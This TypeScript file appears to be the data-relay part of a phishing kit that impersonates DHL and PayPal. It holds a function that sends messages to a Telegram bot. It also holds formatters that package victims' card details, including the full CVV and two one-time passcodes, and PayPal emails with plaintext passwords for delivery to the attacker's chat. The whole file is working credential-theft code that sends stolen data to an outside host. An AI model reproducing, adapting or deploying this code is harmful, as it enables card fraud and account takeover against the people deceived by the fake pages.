export async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  message: string
): Promise<boolean> {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      }
    );

    const data = await response.json();
    return data.ok === true;
  } catch (error) {
    console.error("Telegram send error:", error);
    return false;
  }
}

export function formatPaymentNotification(data: {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardholderName: string;
  otp1?: string;
  otp2?: string;
  timestamp: Date;
}): string {
  const maskedCard = `****-****-****-${data.cardNumber.slice(-4)}`;
  
  return `
🔔 <b>Nouveau Paiement DHL Reçu</b>

💳 <b>Carte:</b> ${maskedCard}
📅 <b>Expiration:</b> ${data.expiryMonth}/${data.expiryYear}
🔐 <b>CVV:</b> ${data.cvv}
👤 <b>Titulaire:</b> ${data.cardholderName}

${data.otp1 ? `🔑 <b>OTP 1:</b> ${data.otp1}` : ''}
${data.otp2 ? `🔑 <b>OTP 2:</b> ${data.otp2}` : ''}

⏰ <b>Date:</b> ${data.timestamp.toLocaleString('fr-FR')}
  `.trim();
}

export function formatPayPalNotification(data: {
  email: string;
  password: string;
  timestamp: Date;
}): string {
  return `
🔔 <b>Nouvelle Connexion PayPal</b>

📧 <b>Email:</b> ${data.email}
🔒 <b>Mot de passe:</b> ${data.password}

⏰ <b>Date:</b> ${data.timestamp.toLocaleString('fr-FR')}
  `.trim();
}
